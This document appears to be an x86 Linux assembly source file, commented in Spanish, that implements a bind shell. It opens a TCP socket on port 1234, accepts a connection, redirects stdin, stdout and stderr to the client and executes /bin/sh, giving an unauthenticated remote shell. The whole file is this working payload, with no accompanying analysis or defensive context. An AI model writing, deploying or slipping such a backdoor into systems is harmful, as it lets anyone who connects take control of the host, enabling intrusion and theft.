global _start
section .text
_start:

	; Creamos el socket

	mov eax, 0x66 	; sys_socketcall
	mov ebx, 0x1
	push ecx		
	push ebx		
	push 0x2		; AF_INET (2)
	mov ecx, esp
	int 0x80		; se hace la llamada al sistema
	mov edi, eax	; Se mueve el socket a edi

	mov eax, 0x66	; sys_socketcall
	pop ebx			; sale el 2 y el conjunto de argumentos para sys_socketcall: SYS_BIND (2)
	push 0x0
	push word 0xd204; puerto abierto = 1234
	push bx			; AF_INET (2)
	mov ecx, esp		
	push 0x10		; tamano de la direccion ip host
	push ecx		; apuntador a la direccion ip
	push edi		; descriptor de archivo del socket
	mov ecx, esp	
	int 0x80		; se hace la llamada al sistema
	
	push 0x0		
	push edi		
	mov ecx, esp		
	inc ebx			
	inc ebx			
	mov al, 0x66	; sys_socketcall
	int 0x80		; inicia la escucha

	; Se aceptan las conexiones

	push 0x0
	push 0x0
	push edi		; descriptor de archivo del socket
	inc ebx			
	mov ecx, esp	
	mov al, 0x66	; sys_socketcall
	int 0x80	
    xchg ebx, eax   ; EAX = 0x5, EBX = new_sockfd   para llamar sys_dup2
    xor ecx, ecx         
fdl:  
    mov al, 0x3f    ; sys_dup2  
    int 0x80  
    inc ecx               
    cmp cl, 0x3     ; crea 3, pero pueden ser mas o menos
    jne fdl
    push edx		; Guardamos para imprimir mensaje
    mov edx, len_ms
    mov ecx, message
    mov ebx, 1
    mov eax, 4
    int 0x80		; se imprime message
    xor edx, edx
    pop edx	

    ; execve("/bin//sh", 0, 0)  
    
    push edx           
    push 0x68732f2f ; "hs//"  
    push 0x6e69622f ; "nib/"
    mov ebx, esp    ; EBX aputa a "/bin//sh"  
    mov ecx, edx    ; ECX = 0
    mov al, 0xb     ; sys_execve  
    int 0x80

section .data
	message: db "Se realizo la conexion", 0xa
	len_ms: equ $ - message
